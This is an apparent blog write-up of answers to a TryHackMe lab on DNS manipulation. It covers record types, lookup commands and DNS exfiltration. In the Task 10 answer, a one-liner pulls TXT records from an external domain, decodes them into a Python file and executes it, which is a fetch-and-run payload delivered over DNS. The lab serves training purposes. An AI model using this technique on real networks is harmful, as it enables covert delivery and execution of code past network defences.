---
layout: post
title: DNS Manipulation - TryHackMe Room
---

Room: [DNS Manipulation](https://tryhackme.com/room/dnsmanipulation)

# Task 4: What is DNS?
### If you were on Windows, what command could you use to query a txt record for 'youtube.com'? 

```bash
nslookup -type=TXT domaintosearch.com 
```

### If you were on Linux, what command could you use to query a txt record for 'facebook.com'?

```bash
dig domaintosearch.com txt
```

### AAAA stores what type of IP Address along with the hostname?

```bash
IPv6
```

### Maximum characters for a DNS TXT Record is 256. (Yay/Nay)

```bash
nay
```

### What DNS Record provides a domain name in reverse-lookup? (Research)

```bash
PTR
```


### What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)
- in your Linux terminal enter the following command replacing the IP of interest

```bash
host IP_ADDRESS
```
# Task 5 What is DNS Exfiltration? 
### What is the maximum length of a DNS name?
Check this [article](https://en.wikipedia.org/wiki/Domain_Name_System)

# Task 7 : Exfiltration Practice
- login with SSH provided 

# Task 10 : Infiltration Practice
- Read the TASK file carefully, you will thank me later, spent time on this ... 

```bash
 nslookup -type=txt REDACTED.badbaddoma.in |grep "Ye" |cut -d \" -f2 |base58 -d |base64 -d > decoded.py

 python3 decoded.py
 

```
